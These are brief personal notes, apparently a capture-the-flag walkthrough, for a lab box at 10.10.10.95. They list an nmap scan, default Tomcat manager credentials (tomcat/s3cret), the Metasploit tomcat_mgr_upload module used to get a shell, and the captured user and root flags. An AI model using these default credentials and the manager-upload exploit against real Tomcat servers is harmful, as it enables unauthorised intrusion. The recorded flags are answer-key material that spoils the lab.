#ip 10.10.10.95

nmap avec -Pn

username : tomcat
password : s3cret

http://10.10.10.95:8080/host-manager

#msfconsole commande :
use exploit/multi/http/tomcat_mgr_upload
show options
....
run
shell

#type sert a afficher un fichier
type "2 for the price of 1.txt"

user flag :
7004dbcef0f854e0fb401875f26ebd00

root flag :
04a8b36e1545a455393d067e772fe90e